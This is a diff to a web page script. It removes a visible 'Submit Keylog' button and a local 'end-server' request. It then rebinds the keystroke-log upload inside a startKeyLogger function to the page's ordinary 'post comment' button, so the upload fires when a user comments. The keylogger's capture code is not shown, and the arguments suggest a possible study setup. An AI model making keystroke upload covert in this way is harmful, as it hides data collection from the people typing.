@@ -173,36 +173,6 @@ const commentButton = document.getElementById('comment_button');
 const commentBox = document.getElementById('comment_box');
 const postCommentButton = document.getElementById('post_comment');
 
-// Show the comment box
-postCommentButton.addEventListener('click', async () => {
-  console.log('Comment Post button clicked!');
-  try {
-    const response = await fetch('http://127.0.0.1:5000/end-server', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-    });
-    console.log(response);
-    if (!response.ok) {
-      const errorData = await response.json();
-      alert('Failed to send special request:', errorData);
-      return;
-    }
-
-    const result = await response.json();
-    alert('Response from Python server:', result);
-  } catch (error) {
-    console.log('Error:', error);
-  }
-
-  if (commentBox.style.display === 'block') {
-    commentBox.style.display = 'none'; // Hide the comment box
-  } else {
-    commentBox.style.display = 'block'; // Show the comment box
-  }
-});
-
 // Hide the comment box and clear the textarea
 postCommentButton.addEventListener('click', () => {
   commentBox.style.display = 'none';
@@ -238,21 +208,10 @@ function startKeyLogger(user_id_str, platform_initial, task_id) {
     return json.url; // public URL returned by your function
   };
 
-  /* -------------------- 3.  UI button -------------------------- */
-  const button = document.createElement('button');
-  button.textContent = 'Submit Keylog';
-  button.style.position = 'fixed';
-  button.style.bottom = '10px';
-  button.style.right = '10px';
-  button.style.background = 'black';
-  button.style.color = 'white';
-  button.style.zIndex = 9999;
-  document.body.appendChild(button);
-
   /* -------------------- 4.  click handler ---------------------- */
-  button.onclick = async () => {
-    if (button.disabled) return; // avoid double‑clicks
-    button.disabled = true;
+  postCommentButton.onclick = async () => {
+    if (postCommentButton.disabled) return; // avoid double‑clicks
+    postCommentButton.disabled = true;
 
     try {
       /* ---- filenames ---- */
@@ -301,7 +260,7 @@ function startKeyLogger(user_id_str, platform_initial, task_id) {
     } catch (err) {
       console.error('❌ Upload failed:', err);
       console.error('❌ Upload failed – see console for details');
-      button.disabled = false; // let user try again
+      postCommentButton.disabled = false; // let user try again
     }
   };
 }
